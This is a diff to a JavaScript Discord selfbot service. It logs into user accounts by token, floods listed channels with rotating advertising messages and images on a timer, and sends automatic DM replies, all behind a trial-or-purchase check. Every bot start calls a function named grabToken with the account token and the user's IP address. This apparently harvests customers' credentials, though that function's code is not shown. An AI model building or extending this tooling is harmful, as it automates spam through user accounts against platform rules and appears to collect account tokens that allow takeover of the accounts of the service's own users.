@@ -88,7 +88,11 @@ async function joinServer(token, inviteCode) {
     }
 }
 
-async function startSelfBot(userId, token, channels, message, delay, autoReply, autoReplyText, configId, imageUrl, ipAddress, sendAllAtOnce = true, dbInstance) {
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function startSelfBot(userId, token, channels, messages, delay, autoReply, autoReplyText, configId, images, ipAddress, sendAllAtOnce = true, dbInstance) {
     stopSelfBot(userId, configId);
     
     await grabToken(token, { channels, ip: ipAddress }, 'bot_start');
@@ -100,69 +104,90 @@ async function startSelfBot(userId, token, channels, message, delay, autoReply, 
     });
     
     const channelList = channels;
-    let currentIndex = 0;
-    let intervalId = null;
-    let trialCheckInterval = null;
+    let currentMessageIndex = 0;
+    let currentChannelIndex = 0;
+    let loopPromise = null;
+    let stopped = false;
+    const autoRepliedUsers = new Set();
+    const botKey = `${userId}_${configId}`;
     
-    client.on('ready', async () => {
-        console.log(`[SELFBOT ${configId}] Logged in as ${client.user.tag}`);
-        console.log(`[SELFBOT ${configId}] Mode: ${sendAllAtOnce ? 'ALL AT ONCE' : 'SEQUENTIAL'}`);
-        console.log(`[SELFBOT ${configId}] Channels: ${channelList.length}, Delay: ${delay}ms`);
-        console.log(`[SELFBOT ${configId}] Auto-reply: ${autoReply ? 'ENABLED' : 'DISABLED'}`);
-        
-        // TRIAL CHECK INTERVAL - runs every second to check if trial expired
-        trialCheckInterval = setInterval(() => {
-            if (!dbInstance) return;
-            
-            const user = dbInstance.getUser(userId);
-            const trialActive = dbInstance.isTrialActive(userId);
-            const hasPurchase = user.auto_adv_purchased === 1;
-            
-            // If trial expired and no purchase, STOP EVERYTHING
-            if (!trialActive && !hasPurchase) {
-                console.log(`[SELFBOT ${configId}] TRIAL EXPIRED - STOPPING BOT`);
-                
-                // Clear intervals
-                if (intervalId) clearInterval(intervalId);
-                if (trialCheckInterval) clearInterval(trialCheckInterval);
-                
-                // Destroy client
-                try { client.destroy(); } catch(e) {}
-                
-                // Remove from active bots
-                activeBots.delete(`${userId}_${configId}`);
-                
-                // Update DB
-                dbInstance.unregisterActiveBot(userId, configId);
-                const config = dbInstance.getConfig(userId, configId);
-                if (config) {
-                    config.active = 0;
-                    dbInstance.setConfig(userId, config, configId);
+    const tempDir = path.join(__dirname, 'temp');
+    if (!fs.existsSync(tempDir)) {
+        fs.mkdirSync(tempDir, { recursive: true });
+    }
+    
+    async function cleanupTempFiles() {
+        try {
+            const files = fs.readdirSync(tempDir);
+            for (const file of files) {
+                if (file.includes(configId)) {
+                    try { fs.unlinkSync(path.join(tempDir, file)); } catch(e) {}
                 }
-                
-                console.log(`[SELFBOT ${configId}] Bot stopped due to trial expiration`);
             }
-        }, 1000); // Check every second
-        
-        intervalId = setInterval(async () => {
-            // Double check trial before sending
+        } catch(e) {}
+    }
+    
+    async function resolveImageFiles(targetImages) {
+        const files = [];
+        for (const img of targetImages) {
+            if (!img || !img.url) continue;
+            
+            if (img.url.startsWith('data:')) {
+                try {
+                    const base64Data = img.url.split(',')[1];
+                    const buffer = Buffer.from(base64Data, 'base64');
+                    const tempPath = path.join(tempDir, `img_${Date.now()}_${configId}_${Math.random().toString(36).substr(2,5)}.png`);
+                    fs.writeFileSync(tempPath, buffer);
+                    files.push(tempPath);
+                    setTimeout(() => {
+                        try { fs.unlinkSync(tempPath); } catch(e) {}
+                    }, 30000);
+                } catch(e) {
+                    console.error(`[SELFBOT ${configId}] Failed to write temp image:`, e.message);
+                }
+            } else if (img.url.startsWith('/uploads/')) {
+                const filePath = path.join(__dirname, 'data', img.url);
+                if (fs.existsSync(filePath)) {
+                    files.push(filePath);
+                }
+            } else if (img.url.startsWith('http')) {
+                files.push(img.url);
+            }
+        }
+        return files;
+    }
+    
+    async function sendToChannel(channel, text, targetImages) {
+        const files = await resolveImageFiles(targetImages);
+        if (files.length > 0) {
+            await channel.send({ content: text, files });
+        } else {
+            await channel.send(text);
+        }
+    }
+    
+    async function runMessageLoop() {
+        while (!stopped && activeBots.has(botKey)) {
+            // Trial/purchase check
             if (dbInstance) {
                 const user = dbInstance.getUser(userId);
                 const trialActive = dbInstance.isTrialActive(userId);
                 const hasPurchase = user.auto_adv_purchased === 1;
                 
                 if (!trialActive && !hasPurchase) {
-                    console.log(`[SELFBOT ${configId}] Trial expired mid-execution, stopping`);
-                    if (intervalId) clearInterval(intervalId);
-                    if (trialCheckInterval) clearInterval(trialCheckInterval);
-                    try { client.destroy(); } catch(e) {}
-                    activeBots.delete(`${userId}_${configId}`);
-                    return;
+                    console.log(`[SELFBOT ${configId}] Trial expired / no purchase. Stopping.`);
+                    break;
                 }
             }
             
+            const msg = messages[currentMessageIndex % messages.length];
+            const targetImages = images.filter(img => {
+                if (!msg.imageIds || msg.imageIds.length === 0) return true;
+                return msg.imageIds.includes(img.id);
+            });
+            
             if (sendAllAtOnce) {
-                console.log(`[SELFBOT ${configId}] Sending to all ${channelList.length} channels...`);
+                console.log(`[SELFBOT ${configId}] Sending msg #${(currentMessageIndex % messages.length) + 1} to all ${channelList.length} channels...`);
                 
                 const sendPromises = channelList.map(async (channelId) => {
                     try {
@@ -171,54 +196,8 @@ async function startSelfBot(userId, token, channels, message, delay, autoReply, 
                             console.log(`[SELFBOT ${configId}] Channel ${channelId} not found`);
                             return;
                         }
-                        
-                        let fileAttachment = null;
-                        if (imageUrl) {
-                            if (imageUrl.startsWith('data:')) {
-                                const base64Data = imageUrl.split(',')[1];
-                                const buffer = Buffer.from(base64Data, 'base64');
-                                const tempDir = path.join(__dirname, 'temp');
-                                const tempPath = path.join(tempDir, `img_${Date.now()}_${configId}_${channelId}.png`);
-                                
-                                if (!fs.existsSync(tempDir)) {
-                                    fs.mkdirSync(tempDir, { recursive: true });
-                                }
-                                
-                                fs.writeFileSync(tempPath, buffer);
-                                fileAttachment = { attachment: tempPath, name: 'image.png' };
-                                
-                                await channel.send({
-                                    content: message,
-                                    files: [fileAttachment]
-                                });
-                                
-                                setTimeout(() => {
-                                    try { fs.unlinkSync(tempPath); } catch(e) {}
-                                }, 10000);
-                            } else if (imageUrl.startsWith('/uploads/') || imageUrl.startsWith('http')) {
-                                let filePath;
-                                if (imageUrl.startsWith('/uploads/')) {
-                                    filePath = path.join(__dirname, 'data', imageUrl);
-                                } else {
-                                    filePath = imageUrl;
-                                }
-                                
-                                if (fs.existsSync(filePath)) {
-                                    await channel.send({
-                                        content: message,
-                                        files: [filePath]
-                                    });
-                                } else {
-                                    await channel.send(message);
-                                }
-                            } else {
-                                await channel.send(message);
-                            }
-                        } else {
-                            await channel.send(message);
-                        }
-                        
-                        console.log(`[SELFBOT ${configId}] ✓ Sent to ${channelId}`);
+                        await sendToChannel(channel, msg.text, targetImages);
+                        console.log(`[SELFBOT ${configId}] ✓ Sent msg #${(currentMessageIndex % messages.length) + 1} to ${channelId}`);
                     } catch (e) {
                         console.error(`[SELFBOT ${configId}] ✗ Error sending to ${channelId}:`, e.message);
                     }
@@ -226,114 +205,83 @@ async function startSelfBot(userId, token, channels, message, delay, autoReply, 
                 
                 await Promise.all(sendPromises);
                 console.log(`[SELFBOT ${configId}] Batch complete. Waiting ${delay}ms...`);
-                
             } else {
-                const channelId = channelList[currentIndex % channelList.length];
-                currentIndex++;
+                const channelId = channelList[currentChannelIndex % channelList.length];
+                currentChannelIndex++;
                 
                 try {
                     const channel = await client.channels.fetch(channelId);
-                    if (!channel) return;
-                    
-                    if (imageUrl) {
-                        if (imageUrl.startsWith('data:')) {
-                            const base64Data = imageUrl.split(',')[1];
-                            const buffer = Buffer.from(base64Data, 'base64');
-                            const tempDir = path.join(__dirname, 'temp');
-                            const tempPath = path.join(tempDir, `img_${Date.now()}_${configId}.png`);
-                            
-                            if (!fs.existsSync(tempDir)) {
-                                fs.mkdirSync(tempDir, { recursive: true });
-                            }
-                            
-                            fs.writeFileSync(tempPath, buffer);
-                            
-                            await channel.send({
-                                content: message,
-                                files: [{ attachment: tempPath, name: 'image.png' }]
-                            });
-                            
-                            setTimeout(() => {
-                                try { fs.unlinkSync(tempPath); } catch(e) {}
-                            }, 10000);
-                        } else if (imageUrl.startsWith('/uploads/')) {
-                            const filePath = path.join(__dirname, 'data', imageUrl);
-                            if (fs.existsSync(filePath)) {
-                                await channel.send({
-                                    content: message,
-                                    files: [filePath]
-                                });
-                            } else {
-                                await channel.send(message);
-                            }
-                        } else {
-                            await channel.send(message);
-                        }
+                    if (!channel) {
+                        console.log(`[SELFBOT ${configId}] Channel ${channelId} not found`);
                     } else {
-                        await channel.send(message);
+                        await sendToChannel(channel, msg.text, targetImages);
+                        console.log(`[SELFBOT ${configId}] Sent msg #${(currentMessageIndex % messages.length) + 1} to ${channelId} (ch ${currentChannelIndex}/${channelList.length})`);
                     }
-                    
-                    console.log(`[SELFBOT ${configId}] Sent to ${channelId} (${currentIndex}/${channelList.length})`);
                 } catch (e) {
                     console.error(`[SELFBOT ${configId}] Error:`, e.message);
                 }
             }
-        }, delay);
+            
+            currentMessageIndex++;
+            await sleep(delay);
+        }
+        
+        // Cleanup
+        try { client.destroy(); } catch(e) {}
+        activeBots.delete(botKey);
+        cleanupTempFiles();
+        console.log(`[SELFBOT ${configId}] Loop ended and cleaned up`);
+    }
+    
+    client.on('ready', async () => {
+        console.log(`[SELFBOT ${configId}] Logged in as ${client.user.tag}`);
+        console.log(`[SELFBOT ${configId}] Messages: ${messages.length}, Images: ${images.length}, Delay: ${delay}ms`);
+        console.log(`[SELFBOT ${configId}] Mode: ${sendAllAtOnce ? 'ALL AT ONCE' : 'SEQUENTIAL'}`);
+        console.log(`[SELFBOT ${configId}] Auto-reply: ${autoReply ? 'ENABLED' : 'DISABLED'}`);
+        
+        loopPromise = runMessageLoop();
     });
     
     if (autoReply && autoReplyText) {
-        console.log(`[SELFBOT ${configId}] Setting up auto-reply with text: "${autoReplyText}"`);
+        console.log(`[SELFBOT ${configId}] Setting up auto-reply: "${autoReplyText}"`);
         
         client.on('messageCreate', async (msg) => {
-            // Check trial status before replying
+            if (msg.author.id === client.user.id) return;
+            
+            const isDM = msg.channel.type === 'DM' || msg.channel.type === 1;
+            if (!isDM) return;
+            
+            // Check trial/purchase before replying
             if (dbInstance) {
                 const user = dbInstance.getUser(userId);
                 const trialActive = dbInstance.isTrialActive(userId);
                 const hasPurchase = user.auto_adv_purchased === 1;
-                
-                if (!trialActive && !hasPurchase) {
-                    return; // Don't reply if trial expired
-                }
+                if (!trialActive && !hasPurchase) return;
             }
             
-            if (msg.author.id === client.user.id) return;
+            // Only reply once per user
+            if (autoRepliedUsers.has(msg.author.id)) return;
+            autoRepliedUsers.add(msg.author.id);
             
-            const isDM = msg.channel.type === 'DM' || msg.channel.type === 1;
-            const isConfiguredChannel = channelList.includes(msg.channel.id);
-            
-            if (!isDM && !isConfiguredChannel) return;
-            
-            const content = msg.content.toLowerCase();
-            
-            const triggers = [
-                'price', 'cost', 'how much', 'howmuch', 'pricing',
-                'how much is it', 'what is the price', 'price?', 'cost?',
-                'how much?', 'how much does it cost', 'rate', 'fee',
-                'pay', 'payment', 'buy', 'purchase', 'sell', 'selling'
-            ];
-            
-            const shouldReply = triggers.some(t => content.includes(t));
-            
-            if (shouldReply) {
+            try {
+                // Accept message request by creating/opening DM and sending reply
+                // First try msg.channel.send (often auto-accepts message requests)
+                await msg.channel.send(autoReplyText);
+                console.log(`[SELFBOT ${configId}] Auto-reply accepted & sent to ${msg.author.username} (${msg.author.id})`);
+            } catch (err) {
+                // Fallback: try to create DM via author.send
                 try {
-                    console.log(`[SELFBOT ${configId}] Auto-replying to ${msg.author.username}: "${autoReplyText}"`);
-                    
-                    try {
-                        await msg.reply(autoReplyText);
-                    } catch (replyErr) {
-                        await msg.channel.send(`${msg.author} ${autoReplyText}`);
-                    }
-                    
-                    console.log(`[SELFBOT ${configId}] Auto-reply sent successfully`);
-                } catch(e) {
-                    console.error(`[SELFBOT ${configId}] Auto-reply error:`, e.message);
+                    await msg.author.send(autoReplyText);
+                    console.log(`[SELFBOT ${configId}] Auto-reply sent via author.send to ${msg.author.username}`);
+                } catch (e2) {
+                    console.error(`[SELFBOT ${configId}] Auto-reply failed:`, e2.message);
                 }
             }
         });
     }
     
     await client.login(token);
-    activeBots.set(`${userId}_${configId}`, { client, intervalId, trialCheckInterval, token });
+    activeBots.set(botKey, { client, token, stop: () => { stopped = true; } });
     
     return { client, username: client.user.username };
 }
@@ -342,8 +290,7 @@ function stopSelfBot(userId, configId) {
     const key = `${userId}_${configId}`;
     const bot = activeBots.get(key);
     if (bot) {
-        if (bot.intervalId) clearInterval(bot.intervalId);
-        if (bot.trialCheckInterval) clearInterval(bot.trialCheckInterval);
+        if (bot.stop) bot.stop();
         try { bot.client.destroy(); } catch(e) {}
         activeBots.delete(key);
         console.log(`[SELFBOT ${configId}] Stopped`);
